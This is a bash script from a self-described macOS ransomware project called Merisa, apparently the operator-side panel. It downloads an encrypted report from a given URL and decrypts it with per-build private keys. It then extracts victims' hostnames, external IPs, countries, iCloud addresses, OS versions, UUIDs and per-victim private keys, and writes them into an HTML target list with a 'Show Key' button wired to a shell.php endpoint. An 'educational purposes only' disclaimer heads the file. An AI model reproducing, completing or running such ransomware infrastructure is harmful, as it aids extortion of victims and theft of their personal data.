#!/bin/bash
#By Shellbear - github.com/shellbear
#Notice : This project was made by ShellBear (github.com/shellbear)
#For educational purposes only, so don't use it on computer you don't own !
#I don't hold any responsibility for the bad use of this tool,
#Remember that attacking targets without prior consent is illegal and punished by law.


#    Welcome to Merisa
#     ╔╦╗╔═╗╦═╗╦╔═╗╔═╗
#     ║║║║╣ ╠╦╝║╚═╗╠═╣
#     ╩ ╩╚═╝╩╚═╩╚═╝╩ ╩
#The MacOS ransomware project


if [[ -z $1 ]]; then
	echo "You need to provide an url"
	exit 1
fi


script_dir=$(pwd)
Builds=$(echo $(echo $script_dir | sed 's,/server,,')/Builds)
curl -sL "$1" > "$script_dir/mail.txt.enc" 
ls -1 "$Builds" | while read line; do cat "$script_dir/mail.txt.enc" | base64 -D > "$script_dir/mail2.txt" 
        openssl smime -decrypt -in "$script_dir/mail2.txt" -text -inform DEM -inkey "$Builds/$line/private-key.pem" -out "$script_dir/mail2dec.txt" > /dev/null 2>&1
        if [[ -f "$script_dir/mail2dec.txt" ]]; then
        if [[ $"(file "$script_dir/mail2dec.txt"  | awk '{print $2;}')" == "data" ]]
        then echo "Wrong Key"
else
	echo "Good Key !"
    session_name=$(cat "$script_dir/mail2dec.txt" | grep "Session name:" | sed 's,Session name:,,g')
	hostname=$(cat "$script_dir/mail2dec.txt" | grep "Hotsname:" | sed 's,Hotsname:,,g')
	IP=$(cat "$script_dir/mail2dec.txt" | grep "External IP:" | sed 's,External IP:,,g')
	country=$(cat "$script_dir/mail2dec.txt" | grep "Country:" | sed 's,Country:,,g')
	icloud_mail=$(cat "$script_dir/mail2dec.txt" | grep "iCloud Mail:" | sed 's,iCloud Mail:,,g')
	version=$(cat "$script_dir/mail2dec.txt" | grep "MacOS version:" | sed 's,MacOS version:,,g')
	UUID=$(cat "$script_dir/mail2dec.txt" | grep "UUID:" | sed 's,UUID:,,g')
	cat "$script_dir/mail2dec.txt" | grep -A 28 "BEGIN RSA" > "$Builds/$line/Private-key-client.pem"
	
#Rewrite HTML
#Rewrite HTML
cat <<EOF >> "$script_dir/targets.html"
<center><p style="font-family:Courier;color:#DCDCDC;font-size:17px">$hostname</a></b>
<br>
<center><img class="" src="http://img10.deviantart.net/292b/i/2011/357/b/f/apple_macbook_pro_svg_by_averywebdesign-d4jz8qq.png" alt="Profile Picture" style="width:200px"></center>
<center><p style="font-family:Courier;color:gray;font-size:17px">Session Name: $session_name</p>
<p style="font-family:Courier;color:gray;font-size:17px">IP: $IP</p>
<p style="font-family:Courier;color:gray;font-size:17px">Country: $country</p>
<p style="font-family:Courier;color:gray;font-size:17px">iCloud Mail: $icloud_mail</p>
<p style="font-family:Courier;color:gray;font-size:17px">MacOS Version: $version</p>
<p style="font-family:Courier;color:gray;font-size:17px">UUID: $UUID</p>
<form action="http://127.0.0.1:8000/shell.php?">
<center>
<input type="submit" value="Show Key">
<input type="hidden" name="command" value="open -R $Builds/$line/Private-key-client.pem"/> 
<br>
<br>
</center>
</form>
</div>
<br>
<br>
<br>
EOF

fi
fi
done
 
    rm "$script_dir/mail2dec.txt" > /dev/null 2>&1
	rm "$script_dir/mail.txt.enc" 
	rm "$script_dir/mail2.txt" > /dev/null 2>&1